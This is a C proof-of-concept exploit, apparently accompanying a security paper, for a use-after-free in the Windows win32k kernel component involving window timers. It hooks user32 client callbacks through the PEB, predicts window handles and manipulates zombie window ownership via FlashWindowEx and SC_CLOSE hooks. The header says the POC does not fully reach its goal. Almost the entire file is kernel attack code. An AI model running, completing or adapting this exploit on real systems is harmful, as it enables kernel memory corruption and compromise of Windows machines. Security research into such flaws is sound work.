//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #12 - Timer UAF with exit to user-mode.
//

/*
Alas, the actuall callback to user-mode won't happen although this exploit reaches xxxClientFreeWindowClassExtraBytes from FreeTimer,
because it's happenning right inside thread destruction context were callbacks are prohibited.
Meaning that this POC doesn't fully work, but otherwise shows the concept as the paper discusses in section 4.c.

This POC is very advanced and still important as it shows that it was possible to convert the original FlashWindow timers attack of POC #2.
It shows how to change ownership of the zombie window back to another live thread through the SC_CLOSE syscommand trick.
Practically, we create a situation where xxxDestroyWindow is called again after the window is already a zombie,
and the side effect of doing that is that the ownership of the window is changed to that of the calling thread...
It's like doing zombie-reloading but for changing the ownership of the window! fun fun.
*/

#include <windows.h>
#include <stdio.h>

HWND g_hWnd = NULL;

// State helpers to synchronize the two threads involved in the attack.
int thread2Ready = 0;
int ok = 0;
int ok2 = 0;

#define ClientAllocExtraBytes_NO 0x7b
#define ClientFreeExtraBytes_NO 0x7c

typedef NTSTATUS(*faeb_ptr)(ULONG_PTR);
faeb_ptr g_faeb = NULL;
typedef NTSTATUS(*ffeb_ptr)(ULONG_PTR);
ffeb_ptr g_ffeb = NULL;

ULONG_PTR getPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* getUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)getPEB() + 0x58);
}

LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_SYSCOMMAND)
	{
		if (wParam == SC_CLOSE) // Verify it's our command.
		{
			printf("Step #4\n");
			printf("Lock holding window\n");
			// Signal main thread we're ready.
			thread2Ready = 1;
			while (!ok) Sleep(10);
		}
	}

	return 0;
}

DWORD CALLBACK threadProc(LPVOID)
{
	printf("Step #3\n");

	HHOOK hk = SetWindowsHookEx(WH_CBT, hookProc, NULL, GetCurrentThreadId());
	// Enter syscommand handling in the kernel so it just calls a CBT hook.
	// What we really care about is the callback to user-mode to hold a reference
	// on our soon-to-be zombie window.
	// SC_SCREENSAVER is just arbitrary and seems to not do much anyway.
	DefWindowProc(g_hWnd, WM_SYSCOMMAND, SC_CLOSE, 0);
	UnhookWindowsHookEx(hk);
	ok2 = 1;

	Sleep(1000);

	printf("Ready to freetimer\n");
	Sleep(1000);

	DebugBreak();

	ExitThread(10);

	return 0;
}

LRESULT CALLBACK cbtHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_CREATEWND)
	{
		static int once = 1;
		if (once)
		{
			printf("Step #6\n");
			printf("CBT hook\n");
			if (g_hWnd == (HWND)wParam) // Just make sure it's our window.
			{
				// Stop dead right in the middle of xxxCreateWindow.
				// This will leave the window untampered, and the user-mode pointer to the
				// extra bytes is still loaded as is.
				ExitThread(0);
			}
		}
	}

	return 0;
}

LRESULT CALLBACK shellHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HSHELL_REDRAW)
	{
		static int once = 1;
		if (once)
		{
			once = 0;
			printf("flash window shell proc\n");

			DestroyWindow(g_hWnd);

			ok = 1;
			while (!ok2) Sleep(10);
		}
	}
	return 0;
}

LRESULT CALLBACK faeb(ULONG_PTR size)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Step #2\n");
		printf("Client alloc extra bytes called\n");

		// Predict the HWND of our newly created window.
		// we know that a UI handle is divided to two parts, high word and low word.
		// The high word is the one that has the handle unique number,
		// and is bumped by one every time an object is freed.
		// So we use the last g_hWnd1 from the windows we created initially in main.
		// And add one for it to compensate on that last window destruction.
		WORD nextHandle = HIWORD(g_hWnd) + 1;
		// The low word is the index into the handle table, and stays the same.
		WORD indexHandle = LOWORD(g_hWnd);
		// And now we form a DWORD out of these two words, hopefully with the correct full HWND.
		g_hWnd = (HWND)((ULONG_PTR)indexHandle | ((ULONG_PTR)nextHandle << 16));

		printf("Hook it: %d\n", IsWindow(g_hWnd));

		// Create a second thread that will hold a reference on this window, before it becomes a zombie.
		CreateThread(NULL, 0, threadProc, NULL, 0, NULL);
		while (!thread2Ready) Sleep(10);

		printf("Done hooking\n");

		printf("Step #5\n");

		// We have to do two actions to make IsTrayWindow happy and return true
		// 1. We're called too early in window creation process and we still don't have the desktop window set as our parent, so do it now.
		SetParent(g_hWnd, GetDesktopWindow());
		// 2. Set WS_EX_APPWINDOW.
		SetWindowLongPtr(g_hWnd, GWL_EXSTYLE, WS_EX_APPWINDOW);
		// Flash will add the last timer per window (holds a reference) and also start the whole flow.
		FLASHWINFO fwi = { 0 };
		fwi.cbSize = sizeof(fwi);
		fwi.hwnd = g_hWnd;
		fwi.dwFlags = FLASHW_TIMER | FLASHW_TRAY;
		printf("Flash-window\n");
		SetWindowsHookEx(WH_SHELL, shellHookProc, NULL, GetCurrentThreadId());
		FlashWindowEx(&fwi);

		// This goes back to xxxCreateWindow to store the user-mode pointer we just give it.
	}

	return g_faeb(size);
}

LRESULT CALLBACK ffeb(ULONG_PTR ptr)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Step #7\n");
		printf("Client free extra bytes called\n");
	}

	return g_ffeb(ptr);
}

void hookClientCallback(void** ptr, void* stub, DWORD fn)
{
	ULONG_PTR* ptrAddr = &getUser32Callbacks()[fn];
	*ptr = *(void**)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)stub;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);
}

int main()
{
	WNDCLASS wc = { 0 };
	wc.lpszClassName = "someclass";
	wc.lpfnWndProc = DefWindowProc;
	// This is crucial for xxxCreateWindowEx to do client-extra-bytes allocation/deallocation.
	wc.cbWndExtra = 100;
	RegisterClass(&wc);

	// We have a problem where the callback to client allocation stub doesn't supply
	// the HWND of the window we're creating.
	// And unfortunately, it's the first callback from window creation process,
	// meaning that no other mechanism like a CBT hook is helpful.
	// We need to allocate a few windows and destroy them, so the free list is bigger.
	// This raises the probability to predict the HWND from the client allocation stub.
	// Create a dummy window, to get the next HWND handle allocation.
	// Notice how we use the global HWND, so we can predict the HWND of the final window created
	// below in the client allocation stub based on this window we're destroying.
	for (int i = 0; i < 100; i++)
	{
		g_hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
		DestroyWindow(g_hWnd);
	}

	printf("Step #1\n");

	hookClientCallback((void**)&g_faeb, (void*)faeb, ClientAllocExtraBytes_NO);
	hookClientCallback((void**)&g_ffeb, (void*)ffeb, ClientFreeExtraBytes_NO);

	// CBT is where we terminate our own thread.
	SetWindowsHookEx(WH_CBT, cbtHookProc, NULL, GetCurrentThreadId());
	// Remember that by the time CreateWindow returns, we're already done juggling with the window.
	CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	return 0;
}
